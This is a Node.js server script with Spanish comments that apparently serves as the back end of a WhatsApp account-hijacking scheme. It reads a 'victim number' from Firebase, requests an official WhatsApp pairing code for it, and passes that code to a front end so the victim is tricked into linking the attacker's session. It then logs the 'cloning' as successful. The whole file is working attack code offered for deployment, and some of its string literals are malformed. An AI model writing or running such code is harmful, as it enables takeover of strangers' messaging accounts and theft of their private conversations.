const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// Configuración de Firebase Admin
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// Inicialización del cliente WhatsApp
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "whatsapp-master" }),
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox', 
            '--disable-dev-shm-usage', 
            '--single-process'
        ]
    }
});

// Función para procesar números entrantes cada 2 segundos
async function monitorizarSolicitudes() {
    try {
        const docRef = db.collection("wa_clon_global").doc("current_session");
        const snap = await docRef.get();
        
        if (snap.exists) {
            const data = snap.data();
            if (data.status === "solicitando_codigo" && !data.pairingCode) {
                console.log([!] Detectado número víctima: ${data.numero_victima});
                
                // Pedir código oficial a los servidores de WhatsApp
                const code = await client.requestPairingCode(data.numero_victima);
                
                console.log([OK] Código de 8 dígitos generado: ${code});
                
                await docRef.update({
                    pairingCode: code,
                    status: "mostrando_codigo"
                });
            }
        }
    } catch (e) {
        // console.log("Revisando...");
    }
}

// Polling de alta frecuencia
setInterval(monitorizarSolicitudes, 3000);

client.on('ready', () => {
    console.log("[!!!] SESIÓN VINCULADA: Clonación completada con éxito.");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Error al iniciar cliente:", e));

// Servidor de salud para Render
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200);
    res.end('ROBOT ONLINE - PAIRING ACTIVE');
}).listen(port, () => {
    console.log(Motor de alta frecuencia escuchando en puerto ${port});
});
